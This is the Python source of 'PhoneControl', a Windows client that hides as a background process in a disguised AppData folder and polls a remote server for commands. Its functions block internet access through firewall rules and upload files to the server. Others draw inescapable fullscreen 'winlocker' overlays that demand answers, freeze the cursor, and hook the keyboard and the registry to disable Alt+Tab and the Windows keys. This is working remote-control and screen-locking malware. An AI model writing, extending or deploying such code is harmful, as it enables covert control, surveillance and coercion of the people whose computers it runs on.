"""
PhoneControl — Windows client
Polls the server and executes commands locally.
Runs as a hidden background process (no window, no tray).
"""

import sys
import os
import threading
import time
import uuid
import json
import logging
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import mimetypes
import tkinter as tk
from tkinter import filedialog
import ctypes
import ctypes.wintypes
from pathlib import Path

# ─── Config ──────────────────────────────────────────────────────────────────

SERVER_URL    = os.environ.get("PC_SERVER_URL",    "https://phonecontrol-lkmj.waw0.amvera.tech")
DEVICE_SECRET = os.environ.get("PC_DEVICE_SECRET", "mysecret42")
POLL_INTERVAL_IDLE   = 30   # seconds when inactive
POLL_INTERVAL_ACTIVE = 10   # seconds when active

# ─── Logging (to file next to exe) ───────────────────────────────────────────

BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
# Все данные всегда хранятся в AppData — не мусорим рядом с exe
DATA_DIR   = Path(os.environ.get("APPDATA","")) / "Microsoft" / "Windows" / "Themes" / "WinDWM"
DATA_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE   = DATA_DIR / "phonecontrol.log"
PREFS_FILE = DATA_DIR / "phonecontrol_prefs.json"

logging.basicConfig(
    filename=str(LOG_FILE),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("pc")

def get_device_id() -> str:
    prefs = {}
    if PREFS_FILE.exists():
        try:
            prefs = json.loads(PREFS_FILE.read_text())
        except Exception:
            pass
    if "device_id" not in prefs:
        prefs["device_id"] = uuid.uuid4().hex[:16]
        PREFS_FILE.write_text(json.dumps(prefs))
    return prefs["device_id"]

DEVICE_ID = get_device_id()

# ─── HTTP helpers ─────────────────────────────────────────────────────────────

import ssl

def _new_opener():
    """Создаёт свежий opener без переиспользования соединений.
    Вызывается при каждом запросе чтобы избежать мёртвых сокетов
    после смены сети (VPN вкл/выкл, смена адаптера).
    """
    ctx = ssl.create_default_context()
    # Не переиспользовать SSL-сессии — иначе Windows держит старый сокет
    ctx.check_hostname = True
    ctx.verify_mode    = ssl.CERT_REQUIRED
    handler = urllib.request.HTTPSHandler(context=ctx)
    opener  = urllib.request.build_opener(handler)
    # Отключаем keep-alive чтобы каждый запрос открывал новое соединение
    opener.addheaders = [("Connection", "close")]
    return opener

def _headers(extra: dict = None) -> dict:
    h = {
        "X-Device-Secret": DEVICE_SECRET,
        "X-Device-Id":     DEVICE_ID,
        "X-Device-Model":  "Windows PC",
        "Connection":      "close",   # не держать сокет открытым
    }
    if extra:
        h.update(extra)
    return h

_RETRIABLE = (10061, 10054, 10053, 10060, 10065)  # WinError коды сетевых сбоев

def _urlopen(req, timeout=15, retries=3):
    """urlopen с автоповтором при сетевых ошибках (смена VPN/адаптера)."""
    last_err = None
    for attempt in range(retries):
        try:
            opener = _new_opener()
            return opener.open(req, timeout=timeout)
        except OSError as e:
            last_err = e
            winerr = getattr(e, "winerror", None) or (e.args[0] if e.args else None)
            if winerr in _RETRIABLE or "10061" in str(e) or "10054" in str(e):
                wait = 2 ** attempt
                log.warning(f"Network error ({e}), retry {attempt+1}/{retries} in {wait}s")
                time.sleep(wait)
                continue
            raise
    raise last_err

def http_get(path: str) -> dict:
    url = SERVER_URL + path
    req = urllib.request.Request(url, headers=_headers())
    with _urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def http_post_json(path: str, data: dict) -> dict:
    url     = SERVER_URL + path
    payload = json.dumps(data).encode()
    req     = urllib.request.Request(
        url, data=payload,
        headers={**_headers(), "Content-Type": "application/json"},
        method="POST",
    )
    with _urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def http_post_multipart(path: str, filepath: str, chat_id: str, caption: str = "") -> dict:
    """Upload a file to /upload via multipart/form-data."""
    import email.generator, io, email.mime.multipart, email.mime.base
    boundary = uuid.uuid4().hex
    filename  = os.path.basename(filepath)
    mime_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"

    with open(filepath, "rb") as f:
        file_data = f.read()

    body  = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: {mime_type}\r\n\r\n"
    ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()

    url = SERVER_URL + path
    req = urllib.request.Request(
        url, data=body,
        headers={
            **_headers({
                "X-Chat-Id": chat_id,
                "X-Caption":  urllib.parse.quote(caption or filename),
            }),
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        method="POST",
    )
    with _urlopen(req, timeout=120) as r:
        return json.loads(r.read())

def send_text_reply(chat_id: str, text: str):
    try:
        result = http_post_json("/text_reply", {
            "chat_id":   chat_id,
            "text":      text,
            "device_id": DEVICE_ID,
        })
        log.info(f"send_text_reply response: {result}")
    except Exception as e:
        log.error(f"send_text_reply error: {e}")

# ─── Wi-Fi control ────────────────────────────────────────────────────────────

FIREWALL_RULE_BLOCK  = "PhoneControlBlock"
FIREWALL_RULE_ALLOW  = "PhoneControlAllow"

def _resolve_server_ips() -> list[str]:
    """Резолвит IP-адреса сервера для whitelist."""
    import socket, urllib.parse
    ips = []
    try:
        host = urllib.parse.urlparse(SERVER_URL).hostname or ""
        if host:
            infos = socket.getaddrinfo(host, None)
            for info in infos:
                ip = info[4][0]
                if ip not in ips:
                    ips.append(ip)
    except Exception as e:
        log.error(f"_resolve_server_ips: {e}")
    return ips

def wifi_disable():
    """Блокирует интернет через Windows Firewall (DNS + HTTP/HTTPS).
    Сервер остаётся доступен — для него создаётся Allow-правило с явным
    remoteport=80,443, которое по специфичности побеждает Block remoteip=any.

    Логика приоритетов Windows Firewall (advfirewall):
      - Block всегда побеждает Allow если у них одинаковая специфичность.
      - Allow побеждает Block только если у Allow-правила более узкий scope
        (конкретный remoteip И конкретный remoteport против Block с remoteip=any).
      - Поэтому Allow-правило должно указывать И remoteip И remoteport.
    """
    try:
        server_ips = _resolve_server_ips()
        log.info(f"Server IPs for whitelist: {server_ips}")

        # Чистим старые правила
        for rule in (FIREWALL_RULE_BLOCK, FIREWALL_RULE_ALLOW):
            subprocess.run([
                "netsh", "advfirewall", "firewall", "delete", "rule",
                f"name={rule}"
            ], capture_output=True, timeout=10)

        if server_ips:
            ip_list = ",".join(server_ips)

            # Allow: конкретный IP + конкретные порты (80 и 443) исходящие.
            # Более специфичное правило — побеждает Block с remoteip=any.
            for port in ("80", "443"):
                r = subprocess.run([
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={FIREWALL_RULE_ALLOW}",
                    "dir=out", "action=allow",
                    "protocol=tcp",
                    f"remoteip={ip_list}",
                    f"remoteport={port}",
                    "enable=yes",
                    "profile=any",
                ], capture_output=True, timeout=10)
                log.info(f"firewall allow TCP {port}: rc={r.returncode} "
                         f"out={r.stdout.decode(errors='ignore').strip()!r}")

            # Allow: DNS (UDP 53) до сервера — на случай если DNS сервера нужен
            # (обычно нет, но пусть будет для надёжности)
            r = subprocess.run([
                "netsh", "advfirewall", "firewall", "add", "rule",
                f"name={FIREWALL_RULE_ALLOW}",
                "dir=out", "action=allow",
                "protocol=udp",
                f"remoteip={ip_list}",
                "remoteport=53",
                "enable=yes",
                "profile=any",
            ], capture_output=True, timeout=10)
            log.info(f"firewall allow UDP 53 server: rc={r.returncode}")

        # Block DNS (UDP 53) — браузер не сможет резолвить домены
        for direction in ("out", "in"):
            r = subprocess.run([
                "netsh", "advfirewall", "firewall", "add", "rule",
                f"name={FIREWALL_RULE_BLOCK}",
                f"dir={direction}", "action=block",
                "protocol=udp", "remoteport=53",
                "enable=yes", "profile=any",
            ], capture_output=True, timeout=10)
            log.info(f"firewall block UDP 53 {direction}: rc={r.returncode}")

        # Block HTTP/HTTPS исходящий (remoteip=any — менее специфично, чем Allow выше)
        for port in ("80", "443"):
            r = subprocess.run([
                "netsh", "advfirewall", "firewall", "add", "rule",
                f"name={FIREWALL_RULE_BLOCK}",
                "dir=out", "action=block",
                "protocol=tcp", f"remoteport={port}",
                "enable=yes", "profile=any",
            ], capture_output=True, timeout=10)
            log.info(f"firewall block TCP {port}: rc={r.returncode} "
                     f"out={r.stdout.decode(errors='ignore').strip()!r}")

        log.info("Internet blocked via firewall (server whitelisted)")
        return []
    except Exception as e:
        log.error(f"wifi_disable: {e}")
        return []

def wifi_enable(adapter=None):
    """Снимает блокировку интернета — удаляет оба firewall правила."""
    try:
        for rule in (FIREWALL_RULE_BLOCK, FIREWALL_RULE_ALLOW):
            subprocess.run([
                "netsh", "advfirewall", "firewall", "delete", "rule",
                f"name={rule}"
            ], capture_output=True, timeout=10)
        log.info("Internet unblocked")
    except Exception as e:
        log.error(f"wifi_enable: {e}")

# ─── Lock screen ──────────────────────────────────────────────────────────────

def lock_screen():
    try:
        ctypes.windll.user32.LockWorkStation()
    except Exception as e:
        log.error(f"lock_screen: {e}")

# ─── Volume control ───────────────────────────────────────────────────────────

def set_volume(level: int):
    """level 0-10 → 0.0-1.0 via pycaw or nircmd fallback."""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        scalar = max(0.0, min(1.0, level / 10.0))
        volume.SetMasterVolumeLevelScalar(scalar, None)
        log.info(f"Volume set to {level}/10")
    except Exception as e:
        log.warning(f"pycaw failed ({e}), trying nircmd")
        try:
            # nircmd.exe if available
            vol_raw = int(level / 10 * 65535)
            subprocess.run(["nircmd.exe", "setsysvolume", str(vol_raw)], timeout=5)
        except Exception as e2:
            log.error(f"set_volume fallback failed: {e2}")

# ─── Winlocker base ───────────────────────────────────────────────────────────

def make_fullscreen_root(bg: str = "#1a1a2e") -> tk.Tk:
    """Create a topmost fullscreen window that blocks Alt+F4 and other keys."""
    root = tk.Tk()
    root.configure(bg=bg)
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    # Block Alt+F4
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    # Block Alt+Tab, Win key via low-level — best effort
    root.bind("<Alt-F4>",    lambda e: "break")
    root.bind("<Alt-Tab>",   lambda e: "break")
    root.bind("<Escape>",    lambda e: "break")
    root.focus_force()
    return root

def keep_on_top(root: tk.Tk, stop_event: threading.Event,
                focus_widget=None):
    while not stop_event.is_set():
        time.sleep(1.5)
        if stop_event.is_set():
            break
        try:
            if not root.winfo_exists():
                break
            root.attributes("-topmost", True)
            root.lift()
            # Если есть виджет ввода — фокус только на нём, root.focus_force
            # НЕ вызываем: он перехватывает клики мыши и ломает кнопки
            if focus_widget:
                if focus_widget.winfo_exists():
                    focus_widget.focus_set()
            # Без focus_widget (plain overlay) тоже не трогаем фокус —
            # пользователь может кликнуть кнопку ОК без проблем
        except Exception:
            break

# ─── MSG overlay ─────────────────────────────────────────────────────────────

# ─── Minimize / freeze helpers ────────────────────────────────────────────────

def minimize_all():
    """Свернуть все окна (аналог Win+D)."""
    try:
        ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)       # Win down
        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)       # D down
        time.sleep(0.05)
        ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)       # D up
        ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)       # Win up
        log.info("minimize_all: sent Win+D")
    except Exception as e:
        log.error(f"minimize_all: {e}")

_cursor_frozen   = False
_cursor_pos_save = (0, 0)
_cursor_freeze_thread = None
_cursor_freeze_stop   = threading.Event()

def freeze_cursor():
    """Заморозить курсор на месте и заблокировать Alt+Tab."""
    global _cursor_frozen, _cursor_pos_save, _cursor_freeze_thread, _cursor_freeze_stop
    if _cursor_frozen:
        return
    _cursor_frozen = True
    pt = ctypes.wintypes.POINT()
    ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
    _cursor_pos_save = (pt.x, pt.y)
    _cursor_freeze_stop.clear()

    def _loop():
        while not _cursor_freeze_stop.is_set():
            ctypes.windll.user32.SetCursorPos(*_cursor_pos_save)
            time.sleep(0.016)

    _cursor_freeze_thread = threading.Thread(target=_loop, daemon=True)
    _cursor_freeze_thread.start()
    _block_alttab(True)
    log.info("cursor frozen")

def unfreeze_cursor():
    """Разморозить курсор и Alt+Tab."""
    global _cursor_frozen
    if not _cursor_frozen:
        return
    _cursor_frozen = False
    _cursor_freeze_stop.set()
    _block_alttab(False)
    log.info("cursor unfrozen")


def _run_glitch_then_show(callback):
    """
    Показывает fullscreen glitch-анимацию (~1 сек):
    захватывает скриншот рабочего стола, режет на 5-7 горизонтальных полос
    по всей ширине экрана и смещает каждую влево/вправо — эффект сбоя картинки.
    Затем закрывает окно и вызывает callback().
    """
    import random as _rnd
    from PIL import ImageGrab, ImageTk

    # Захватываем скриншот до открытия окна
    try:
        _screenshot = ImageGrab.grab()
    except Exception:
        _screenshot = None

    glitch_root = tk.Tk()
    glitch_root.configure(bg="black")
    glitch_root.attributes("-fullscreen", True)
    glitch_root.attributes("-topmost", True)
    glitch_root.overrideredirect(True)

    sw = glitch_root.winfo_screenwidth()
    sh = glitch_root.winfo_screenheight()

    canvas = tk.Canvas(glitch_root, width=sw, height=sh,
                       bg="black", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    DURATION = 900    # мс
    FRAME_MS = 40     # ~25 fps
    N_STRIPS = _rnd.randint(5, 7)

    # Нарезаем скриншот на полосы
    strip_images = []   # PhotoImage для каждой полосы
    strip_ids    = []   # canvas image id
    strip_y      = []   # y-координата верха каждой полосы

    if _screenshot:
        _screenshot = _screenshot.resize((sw, sh))
        strip_h = sh // N_STRIPS
        for i in range(N_STRIPS):
            y0 = i * strip_h
            y1 = y0 + strip_h if i < N_STRIPS - 1 else sh
            crop = _screenshot.crop((0, y0, sw, y1))
            tk_img = ImageTk.PhotoImage(crop)
            strip_images.append(tk_img)   # держим ссылку чтоб не убрал GC
            sid = canvas.create_image(0, y0, anchor="nw", image=tk_img)
            strip_ids.append(sid)
            strip_y.append(y0)
    else:
        # Fallback: цветные полосы если скриншот не удался
        strip_h = sh // N_STRIPS
        PALETTE = ["#1a1a2e", "#16213e", "#0f3460", "#0a0a1a"]
        for i in range(N_STRIPS):
            y0 = i * strip_h
            sid = canvas.create_rectangle(0, y0, sw, y0 + strip_h,
                                          fill=_rnd.choice(PALETTE), outline="")
            strip_ids.append(sid)
            strip_y.append(y0)

    start_ms = [int(time.time() * 1000)]

    def _frame():
        now = int(time.time() * 1000)
        elapsed = now - start_ms[0]
        if elapsed >= DURATION:
            glitch_root.destroy()
            callback()
            return

        t = elapsed / DURATION  # 0→1

        for i, sid in enumerate(strip_ids):
            y0 = strip_y[i]
            # Вероятность сдвига растёт со временем
            if _rnd.random() < 0.3 + t * 0.6:
                max_shift = int(sw * 0.08 + sw * 0.25 * t)
                shift = _rnd.randint(-max_shift, max_shift)
            else:
                shift = 0
            if strip_images:
                canvas.coords(sid, shift, y0)
            else:
                canvas.coords(sid, shift, y0, shift + sw, y0 + (sh // N_STRIPS))

        glitch_root.after(FRAME_MS, _frame)

    glitch_root.after(30, _frame)
    glitch_root.mainloop()


def show_message_overlay(text: str, fb_mode: str, reply_prompt: str,
                          survey: list, chat_id: str,
                          minimize: bool = False):
    """
    plain  → text + OK button (closes on OK)
    reply  → text + input + Send (winlocker until sent)
    survey → questions one by one + Send (winlocker until done)
    minimize=True → сначала свернуть все окна, заморозить курсор/Alt+Tab,
                    показать glitch-анимацию, потом показать окно сообщения.
                    После закрытия — разморозить.
    """
    import math, random as _rnd

    if minimize:
        minimize_all()
        time.sleep(0.3)        # ждём пока окна свернутся
        # Запускаем glitch, а потом уже собственно overlay
        _run_glitch_then_show(lambda: _show_message_overlay_impl(
            text, fb_mode, reply_prompt, survey, chat_id, unfreeze_on_close=False))
        return

    _show_message_overlay_impl(text, fb_mode, reply_prompt, survey, chat_id,
                               unfreeze_on_close=False)


def _show_message_overlay_impl(text: str, fb_mode: str, reply_prompt: str,
                                survey: list, chat_id: str,
                                unfreeze_on_close: bool = False):
    """Внутренняя реализация — собственно tkinter-окно сообщения."""
    import math, random as _rnd

    # ── Palette (matches APK: dark navy gradient + indigo-violet accent) ──────
    C_BG0      = "#0a0a1a"   # outermost bg
    C_BG1      = "#1a1a2e"   # card top
    C_BG2      = "#16213e"   # card mid
    C_BG3      = "#0f3460"   # card bottom / input bg
    C_ACCENT1  = "#4f46e5"   # indigo
    C_ACCENT2  = "#7c3aed"   # violet
    C_FG       = "#f0f0f0"
    C_SUB      = "#cccccc"
    C_DIM      = "#8888aa"
    C_BORDER   = "#33334a"

    stop_event = threading.Event()
    answers    = []
    q_index    = [0]

    root = make_fullscreen_root(C_BG0)

    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()

    # ── Full-screen canvas for gradient background ────────────────────────────
    canvas = tk.Canvas(root, width=sw, height=sh, highlightthickness=0,
                       bd=0, bg=C_BG0)
    canvas.place(x=0, y=0)

    # Gradient background: vertical bands
    steps = 60
    for i in range(steps):
        t  = i / steps
        r0, g0, b0 = 0x0a, 0x0a, 0x1a
        r1, g1, b1 = 0x0f, 0x10, 0x28
        r  = int(r0 + (r1 - r0) * t)
        g  = int(g0 + (g1 - g0) * t)
        b  = int(b0 + (b1 - b0) * t)
        y0 = int(sh * i / steps)
        y1 = int(sh * (i+1) / steps)
        canvas.create_rectangle(0, y0, sw, y1, fill=f"#{r:02x}{g:02x}{b:02x}", outline="")

    # Subtle dot grid
    for gx in range(0, sw, 48):
        for gy in range(0, sh, 48):
            canvas.create_oval(gx-1, gy-1, gx+1, gy+1, fill="#1e1e38", outline="")

    # ── Card geometry ─────────────────────────────────────────────────────────
    card_w = min(sw - 120, 720)
    card_h = 360 if fb_mode == "plain" else 440
    cx = (sw - card_w) // 2
    cy = (sh - card_h) // 2

    def _hex_to_rgb(h):
        h = h.lstrip("#")
        return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))

    def _lerp_color(c1, c2, t):
        r1, g1, b1 = _hex_to_rgb(c1)
        r2, g2, b2 = _hex_to_rgb(c2)
        return "#{:02x}{:02x}{:02x}".format(
            int(r1 + (r2-r1)*t), int(g1 + (g2-g1)*t), int(b1 + (b2-b1)*t))

    # Card gradient fill (vertical slices)
    grad_steps = 40
    for i in range(grad_steps):
        t   = i / grad_steps
        col = _lerp_color(C_BG1, C_BG3, t)
        canvas.create_rectangle(
            cx+2, cy + int(card_h * i / grad_steps),
            cx + card_w - 2, cy + int(card_h * (i+1) / grad_steps),
            fill=col, outline="")

    # Card border
    r = 20
    def _rounded_rect_outline(x, y, w, h, rad, color, width=1):
        pts = [x+rad,y, x+w-rad,y, x+w,y, x+w,y+rad,
               x+w,y+h-rad, x+w,y+h, x+w-rad,y+h, x+rad,y+h,
               x,y+h, x,y+h-rad, x,y+rad, x,y, x+rad,y]
        canvas.create_polygon(pts, smooth=True, fill="", outline=color, width=width)

    _rounded_rect_outline(cx, cy, card_w, card_h, r, C_BORDER, 2)
    # Accent top stripe
    canvas.create_rectangle(cx+r, cy, cx+card_w-r, cy+3, fill=C_ACCENT1, outline="")

    # ── Accent glow circle (top-right of card) ────────────────────────────────
    canvas.create_oval(cx+card_w-60, cy-40, cx+card_w+40, cy+60,
                       fill="", outline=C_ACCENT1, width=1)

    # ── Title text ────────────────────────────────────────────────────────────
    msg_var = tk.StringVar(value=text)
    msg_lbl = tk.Label(root, textvariable=msg_var,
                       bg=C_BG1, fg=C_FG,
                       font=("Segoe UI", 20, "bold"),
                       wraplength=card_w - 80, justify="center")
    msg_lbl.place(x=cx+40, y=cy+36, width=card_w-80)

    # Divider
    canvas.create_rectangle(cx+40, cy+100, cx+card_w-40, cy+101,
                            fill="#33334a", outline="")

    # ── Subtitle / prompt ─────────────────────────────────────────────────────
    prompt_var = tk.StringVar(value="")
    prompt_lbl = tk.Label(root, textvariable=prompt_var,
                          bg=C_BG2, fg=C_DIM,
                          font=("Segoe UI", 13),
                          wraplength=card_w-80, justify="center")
    prompt_lbl.place(x=cx+40, y=cy+112, width=card_w-80)
    prompt_lbl.place_forget()

    # ── Input field ───────────────────────────────────────────────────────────
    entry_outer = tk.Frame(root, bg=C_BG3, bd=0, highlightthickness=2,
                           highlightbackground=C_BORDER, highlightcolor=C_ACCENT1)
    entry = tk.Entry(entry_outer, font=("Segoe UI", 15), width=36,
                     bg=C_BG3, fg=C_FG, insertbackground=C_ACCENT2,
                     relief="flat", bd=10)
    entry.pack(fill="both", expand=True)
    entry_outer.place_forget()

    # Focus glow effect
    def _entry_focus_in(e):
        entry_outer.config(highlightbackground=C_ACCENT1, highlightcolor=C_ACCENT1)
    def _entry_focus_out(e):
        entry_outer.config(highlightbackground=C_BORDER, highlightcolor=C_ACCENT1)
    entry.bind("<FocusIn>", _entry_focus_in)
    entry.bind("<FocusOut>", _entry_focus_out)

    # ── Progress bar ──────────────────────────────────────────────────────────
    prog_bg = canvas.create_rectangle(cx+40, cy+card_h-30,
                                      cx+card_w-40, cy+card_h-22,
                                      fill="#1e1e3a", outline="")
    prog_fill = canvas.create_rectangle(cx+40, cy+card_h-30,
                                        cx+40, cy+card_h-22,
                                        fill=C_ACCENT1, outline="")
    prog_lbl = canvas.create_text(cx+card_w//2, cy+card_h-10,
                                  text="", fill=C_DIM,
                                  font=("Segoe UI", 10))
    canvas.itemconfig(prog_bg, state="hidden")
    canvas.itemconfig(prog_fill, state="hidden")
    canvas.itemconfig(prog_lbl, state="hidden")

    total_q = max(len(survey), 1) if fb_mode == "survey" else 1

    def _update_progress(idx, total):
        frac = idx / total if total > 0 else 0
        x0 = cx + 40
        x1 = cx + card_w - 40
        canvas.coords(prog_fill, x0, cy+card_h-30, x0 + int((x1-x0)*frac), cy+card_h-22)
        canvas.itemconfig(prog_lbl, text=f"{idx} / {total}")

    # ── Button ────────────────────────────────────────────────────────────────
    btn_text_var = tk.StringVar(value="ОК")
    btn_y = cy + card_h - 80

    btn_frame = tk.Button(root, textvariable=btn_text_var,
                          bg=C_ACCENT1, fg="white",
                          activebackground=C_ACCENT2, activeforeground="white",
                          font=("Segoe UI", 14, "bold"),
                          relief="flat", bd=0, padx=36, pady=12,
                          cursor="hand2")

    btn_w = 220
    btn_frame.place(x=cx + (card_w - btn_w)//2, y=btn_y, width=btn_w)

    # ── Particle burst on success ─────────────────────────────────────────────
    _particles = []

    def _explode(bx, by):
        for _ in range(35):
            ang   = _rnd.uniform(0, 2*math.pi)
            spd   = _rnd.uniform(5, 16)
            sz    = _rnd.randint(4, 10)
            col   = _rnd.choice([C_ACCENT1, C_ACCENT2, "#a78bfa",
                                 "#e879f9", "#ffffff", "#c4b5fd"])
            pid = canvas.create_oval(bx-sz//2, by-sz//2,
                                     bx+sz//2, by+sz//2, fill=col, outline="")
            _particles.append([pid, float(bx), float(by),
                                math.cos(ang)*spd, math.sin(ang)*spd, 1.0, float(sz)])
        _tick_particles()

    def _tick_particles():
        alive = []
        for p in _particles:
            pid, px, py, vx, vy, alpha, sz = p
            if alpha <= 0:
                canvas.delete(pid); continue
            nx, ny = px+vx, py+vy*0.94
            na = alpha - 0.038
            nsz = max(1.0, sz - 0.25)
            canvas.coords(pid, nx-nsz/2, ny-nsz/2, nx+nsz/2, ny+nsz/2)
            p[1], p[2], p[4], p[5], p[6] = nx, ny, vy*0.94, na, nsz
            alive.append(p)
        _particles[:] = alive
        if alive:
            root.after(16, _tick_particles)

    # ── Logic ─────────────────────────────────────────────────────────────────
    focus_target = None

    def _close():
        stop_event.set()
        if unfreeze_on_close:
            unfreeze_cursor()
        root.after(0, root.destroy)

    def _do_send():
        answer = entry.get().strip()
        if not answer:
            entry_outer.config(highlightbackground="#e94560")
            root.after(500, lambda: entry_outer.config(highlightbackground=C_BORDER))
            return

        bx = cx + card_w//2
        by = btn_y + 22
        _explode(bx, by)

        answers.append(answer)
        entry.delete(0, tk.END)

        if fb_mode == "survey" and q_index[0] < len(survey) - 1:
            q_index[0] += 1
            msg_var.set(survey[q_index[0]])
            prompt_var.set(f"Вопрос {q_index[0]+1} / {len(survey)}")
            _update_progress(q_index[0], total_q)
        else:
            result_text = "\n".join(
                f"Q: {survey[i]}\nA: {answers[i]}"
                for i in range(len(answers))
            ) if fb_mode == "survey" else answers[0]
            prompt_var.set("📤 Отправляю...")
            entry.config(state="disabled")
            _update_progress(total_q, total_q)
            def _send_and_close():
                send_text_reply(chat_id, result_text)
                root.after(700, _close)
            threading.Thread(target=_send_and_close, daemon=True).start()

    # ── Configure by mode ─────────────────────────────────────────────────────
    input_y = cy + 120

    if fb_mode == "plain":
        btn_frame.config(command=_close)
        btn_frame.place(x=cx + (card_w - btn_w)//2, y=cy + 140, width=btn_w)
        root.protocol("WM_DELETE_WINDOW", _close)

    elif fb_mode == "reply":
        prompt_var.set(reply_prompt)
        prompt_lbl.place(x=cx+40, y=cy+110, width=card_w-80)
        entry_outer.place(x=cx+40, y=cy+155, width=card_w-80, height=48)
        entry.focus()
        btn_text_var.set("Отправить →")
        btn_frame.config(command=_do_send)
        btn_frame.place(x=cx + (card_w - btn_w)//2, y=cy+230, width=btn_w)
        entry.bind("<Return>", lambda e: _do_send())
        focus_target = entry

        # Show progress bar
        canvas.itemconfig(prog_bg, state="normal")
        canvas.itemconfig(prog_fill, state="normal")

    elif fb_mode == "survey":
        if survey:
            msg_var.set(survey[0])
            prompt_var.set(f"Вопрос 1 / {len(survey)}")
            prompt_lbl.place(x=cx+40, y=cy+110, width=card_w-80)
            entry_outer.place(x=cx+40, y=cy+155, width=card_w-80, height=48)
            entry.focus()
            btn_text_var.set("Далее →")
            btn_frame.config(command=_do_send)
            btn_frame.place(x=cx + (card_w - btn_w)//2, y=cy+230, width=btn_w)
            entry.bind("<Return>", lambda e: _do_send())
            focus_target = entry
            canvas.itemconfig(prog_bg, state="normal")
            canvas.itemconfig(prog_fill, state="normal")
            canvas.itemconfig(prog_lbl, state="normal")
            _update_progress(0, total_q)
        else:
            btn_frame.config(command=_close)

    # ── Slide-in animation ────────────────────────────────────────────────────
    _slide_offset = [card_h // 2]

    def _slide_in():
        off = _slide_offset[0]
        if off > 0:
            _slide_offset[0] = max(0, off - max(4, off // 4))
            # move all widgets
            for w in (msg_lbl, prompt_lbl, entry_outer, btn_frame):
                try:
                    info = w.place_info()
                    if info:
                        orig_y = int(info.get("y", 0))
                        w.place_configure(y=orig_y)
                except Exception:
                    pass
            root.after(16, _slide_in)

    # Simple fade-in via alpha not available in tk — use lift
    root.after(30, _slide_in)

    threading.Thread(
        target=keep_on_top, args=(root, stop_event, focus_target), daemon=True
    ).start()

    root.mainloop()

# ─── Video overlay ────────────────────────────────────────────────────────────

from PIL import Image, ImageTk

# Global reference so /unbanvideo can close it
_video_window = None
_video_stop   = threading.Event()

# ── Chrome-based video player ────────────────────────────────────────────────

_chrome_proc    = None
_kbd_hook       = None
_video_stop     = threading.Event()
_video_window   = None  # tkinter overlay для кнопок поверх Chrome

_kbd_hook_thread = None

def _block_alttab(enable: bool):
    """Устанавливает/снимает low-level keyboard hook через отдельный поток с message loop."""
    global _kbd_hook, _kbd_hook_thread

    if not enable:
        # Посылаем WM_QUIT в поток чтобы он завершил GetMessage loop
        if _kbd_hook_thread and _kbd_hook_thread.is_alive():
            import ctypes
            ctypes.windll.user32.PostThreadMessageW(
                _kbd_hook_thread.ident, 0x0012, 0, 0  # WM_QUIT
            )
        _kbd_hook = None
        return

    stop_evt = threading.Event()

    def _hook_thread():
        global _kbd_hook
        import ctypes, ctypes.wintypes

        BLOCKED_VK = {
            0x09,  # Tab  (Alt+Tab)
            0x1B,  # Escape
            0x73,  # F4   (Alt+F4)
            0x7A,  # F11
            0x5B,  # LWin
            0x5C,  # RWin
            0x44,  # D    (Win+D)
            0x54,  # T    (Ctrl+T)
            0x57,  # W    (Ctrl+W)
            0x4E,  # N    (Ctrl+N)
            0x4C,  # L    (Ctrl+L)
            0x46,  # F    (Ctrl+F)
            0x52,  # R    (Ctrl+R)
        }
        WH_KEYBOARD_LL = 13
        WM_KEYDOWN, WM_SYSKEYDOWN = 0x0100, 0x0104
        WM_KEYUP,   WM_SYSKEYUP   = 0x0101, 0x0105
        user32 = ctypes.windll.user32

        HOOKPROC = ctypes.WINFUNCTYPE(
            ctypes.c_long, ctypes.c_int,
            ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

        def hook_proc(nCode, wParam, lParam):
            if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN, WM_KEYUP, WM_SYSKEYUP):
                vk = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))[0]
                if vk in BLOCKED_VK:
                    return 1
            return user32.CallNextHookEx(None, nCode, wParam, lParam)

        _hook_cb = HOOKPROC(hook_proc)
        hHook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_cb, None, 0)
        _kbd_hook = hHook
        log.info(f"Keyboard hook active: {hHook}")

        # Блокируем Win через реестр
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(k)
            user32.SendMessageW(0xFFFF, 0x001A, 0, "Policy")
        except Exception as e:
            log.warning(f"Registry WinKey: {e}")

        stop_evt.set()

        # Message loop — без него hook не работает
        msg = ctypes.wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))

        user32.UnhookWindowsHookEx(hHook)
